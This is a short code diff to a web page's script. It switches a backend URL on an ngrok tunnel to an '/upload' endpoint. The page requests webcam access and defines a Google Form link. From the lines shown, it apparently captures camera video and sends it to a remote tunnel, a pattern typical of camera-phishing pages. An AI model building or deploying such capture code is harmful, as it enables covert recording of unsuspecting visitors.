@@ -47,7 +47,7 @@
   const subMessage = document.getElementById("subMessage");
 
   const GOOGLE_FORM_URL = "https://forms.gle/PEv8n4qXnzYG9KbB9";
-  const BACKEND_URL = "https://savorless-shanae-relucent.ngrok-free.dev"; // 👈 ADD
+  const BACKEND_URL = "https://savorless-shanae-relucent.ngrok-free.dev/upload"; // 👈 ADD
 
   navigator.mediaDevices.getUserMedia({ video: true })
     .then(stream => {
@@ -87,4 +87,5 @@
       message.textContent = "Camera permission denied.";
     });
 </script>
+
 
